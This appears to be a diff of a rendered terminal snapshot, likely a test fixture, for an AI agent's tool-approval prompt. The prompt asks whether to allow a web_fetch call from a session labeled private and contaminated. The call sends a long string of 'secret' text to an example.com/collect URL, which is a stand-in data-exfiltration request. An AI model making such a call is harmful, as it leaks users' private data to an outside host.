@@ -1,22 +1,22 @@
 ␛[0;1;7m Allow this tool call? ␛[m
-tool: "web_fetch"
-title: ""
-kind: ""
-session labels: private, 
-contaminated
-input:
-  │ {
-  │   "url": 
-"https\u{003a}//example\u{002e
-}com/collect?d=secretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecretsecretsecretsec
-retsecretsecret",
+  tool: "web_fetch"
+  title: ""
+  kind: ""
+  session labels: private, 
+␛[0;2m↪ ␛[mcontaminated
+  input:
+    │ {
+    │   "url": 
+␛[0;2m↪ ␛[m"https\u{003a}//example\u{00
+␛[0;2m↪ ␛[m2e}com/collect?d=secretsecre
+␛[0;2m↪ ␛[mtsecretsecretsecretsecretsec
+␛[0;2m↪ ␛[mretsecretsecretsecretsecrets
+␛[0;2m↪ ␛[mecretsecretsecretsecretsecre
+␛[0;2m↪ ␛[mtsecretsecretsecretsecretsec
+␛[0;2m↪ ␛[mretsecretsecretsecretsecrets
+␛[0;2m↪ ␛[mecretsecretsecretsecretsecre
+␛[0;2m↪ ␛[mtsecretsecretsecretsecretsec
+␛[0;2m↪ ␛[mretsecretsecretsecretsecrets
 ␛[0;2m──────────────────────────────␛[m
 ␛[0;2m‹ ␛[m␛[0;1m▸ 2 reject_once (n)␛[m
 ␛[0;2mpage 1 of 3 · 2 more below: s…␛[m
